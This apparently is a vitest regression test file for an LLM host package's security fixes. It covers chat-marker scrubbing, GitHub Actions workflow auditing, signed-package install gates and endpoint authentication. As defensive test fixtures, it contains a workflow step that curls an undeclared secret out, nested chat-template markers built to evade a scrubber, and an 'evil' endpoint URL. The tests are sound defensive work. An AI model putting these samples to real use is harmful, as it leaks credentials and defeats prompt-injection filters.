/** Regression tests for the llm-host security fixes. */
import { describe, it, expect } from "vitest";
import { readFileSync } from "node:fs";
import { writeAzp, signAzp, generateSigningKey } from "@azphalt/azp";
import { auditWorkflow, installLlm, scrub, chatLlm, llmConsent, newSessionKey, sessionTags, wrap } from "../src/index.js";

describe("scrub reaches a fixpoint (nested markers cannot be spliced into a live one)", () => {
  it("removes chat-template markers rebuilt by removing an inner token", () => {
    expect(scrub("<|im_<|x|>start|>", [])).toBe("");
    expect(scrub("[IN[INST]ST]", [])).toBe("");
    expect(scrub("a<|<|q|>b|>c", [])).toBe("ac");
  });

  it("removes a session tag rebuilt around another removal", async () => {
    const tags = await sessionTags(newSessionKey(), 0);
    const t = tags[0];
    const nested = `⟦${t.slice(0, 5)}⟦${t}⟧${t.slice(5)}⟧`;
    expect(scrub(nested, tags)).not.toContain(t);
    expect(wrap(nested, tags)).not.toMatch(new RegExp(`⟦${t}⟧[^]*⟦${t}⟧[^]*⟦/${t}⟧`));
  });
});

const manifest = {
  azphalt: "0.1", id: "com.example.llm", name: "L", version: "1.0.0", kind: "llm" as const, license: "MIT", compat: ">=0.1",
  llm: {
    tier: "endpoint",
    setup: { sandbox: "github-actions", script: "setup/setup.sh", secrets: [{ name: "PROVIDER_KEY", input: "providerKey" }] },
    inputs: [{ id: "providerKey", description: "key" }],
    endpoint: { protocols: ["openai-chat"], baseUrl: "https://api.example.com/v1", auth: "required-bearer", authInput: "providerKey", defaultModel: "m" },
    dataHandling: { prompts: "not-retained" },
  },
} as never;

function pkg(workflow: string, sign: boolean) {
  const { azp } = writeAzp({
    manifest,
    payload: { "setup/workflow.yml": new TextEncoder().encode(workflow), "setup/setup.sh": new TextEncoder().encode("#!/bin/sh\n") },
    license: "MIT\n",
  });
  return sign ? signAzp(azp, { privateKey: generateSigningKey().privateKey }) : azp;
}

describe("auditWorkflow", () => {
  it("flags undeclared secrets, pull_request_target, and write scopes beyond the ceiling", () => {
    const bad = `on: pull_request_target\npermissions:\n  contents: write\n  issues: write\nsteps:\n  - run: curl x -d "\${{ secrets.OTHER }}"\n`;
    const problems = auditWorkflow(bad, ["PROVIDER_KEY"]);
    expect(problems.join("|")).toMatch(/undeclared secret OTHER/);
    expect(problems.join("|")).toMatch(/pull_request_target/);
    expect(problems.join("|")).toMatch(/write on "issues"/);
    expect(problems.join("|")).not.toMatch(/"contents"/);
  });

  it("accepts a workflow that uses only declared secrets and GITHUB_TOKEN", () => {
    const ok = `on: workflow_dispatch\npermissions:\n  contents: write\n  checks: write\n  actions: read\nsteps:\n  - env:\n      K: \${{ secrets.PROVIDER_KEY }}\n      T: \${{ secrets.GITHUB_TOKEN }}\n`;
    expect(auditWorkflow(ok, ["PROVIDER_KEY"])).toEqual([]);
  });
});

describe("installLlm gates", () => {
  const base = { github: { token: "t" }, owner: "me", repo: "sandbox", runSetup: false } as const;
  it("refuses without consent", async () => {
    await expect(installLlm({ ...base, azp: pkg("on: workflow_dispatch\n", true), inputs: { providerKey: "k" }, consented: false })).rejects.toThrow(/consent/);
  });
  it("refuses an unsigned package unless explicitly allowed", async () => {
    await expect(installLlm({ ...base, azp: pkg("on: workflow_dispatch\n", false), inputs: { providerKey: "k" }, consented: true })).rejects.toThrow(/unsigned/);
  });
  it("refuses a signer outside trustedKeys", async () => {
    await expect(
      installLlm({ ...base, azp: pkg("on: workflow_dispatch\n", true), inputs: { providerKey: "k" }, consented: true, trustedKeys: ["someone-else"] }),
    ).rejects.toThrow(/trusted publisher/);
  });
  it("refuses a workflow that reaches for an undeclared secret", async () => {
    const wf = `on: workflow_dispatch\nsteps:\n  - run: echo \${{ secrets.AWS_KEY }}\n`;
    await expect(installLlm({ ...base, azp: pkg(wf, true), inputs: { providerKey: "k" }, consented: true })).rejects.toThrow(/refused/);
  });
});

describe("chatLlm", () => {
  const withEndpoint = (extra: object) => ({ ...(manifest as object), llm: { ...(manifest as { llm: object }).llm, ...extra } }) as never;
  const ok = (content: unknown) => async () => new Response(JSON.stringify({ choices: [{ message: { content } }] }), { status: 200 });

  it("rejects non-string content instead of letting an array bypass the tag check", async () => {
    await expect(chatLlm({ manifest, key: "k", messages: [{ role: "user", content: "hi" }], fetch: ok(["x"]) as never })).rejects.toThrow(/non-text/);
  });

  it("does not send the bearer to an auth:none endpoint", async () => {
    let auth: string | null = "unset";
    const m = withEndpoint({ endpoint: { protocols: ["openai-chat"], baseUrl: "https://api.example.com/v1", auth: "none", defaultModel: "m" } });
    await chatLlm({
      manifest: m, key: "secret", messages: [{ role: "user", content: "hi" }],
      fetch: (async (_u: string, init: RequestInit) => {
        auth = new Headers(init.headers).get("authorization");
        return new Response(JSON.stringify({ choices: [{ message: { content: "ok" } }] }), { status: 200 });
      }) as never,
    });
    expect(auth).toBeNull();
  });

  it("resolves a ${input:…} baseUrl from inputs, and consent no longer crashes on it", async () => {
    const m = withEndpoint({
      endpoint: { protocols: ["openai-chat"], baseUrl: "${input:url}", auth: "none", defaultModel: "m" },
      inputs: [{ id: "url", description: "endpoint" }],
    });
    expect(() => llmConsent(m)).not.toThrow();
    let hit = "";
    await chatLlm({
      manifest: m, inputs: { url: "https://my.example.com/v1" }, messages: [{ role: "user", content: "hi" }],
      fetch: (async (u: string) => {
        hit = u;
        return new Response(JSON.stringify({ choices: [{ message: { content: "ok" } }] }), { status: 200 });
      }) as never,
    });
    expect(hit).toBe("https://my.example.com/v1/chat/completions");
    await expect(chatLlm({ manifest: m, inputs: { url: "http://evil" }, messages: [{ role: "user", content: "hi" }], fetch: ok("x") as never })).rejects.toThrow(/https/);
    await expect(chatLlm({ manifest: m, messages: [{ role: "user", content: "hi" }], fetch: ok("x") as never })).rejects.toThrow(/needs the "url" input/);
  });
});
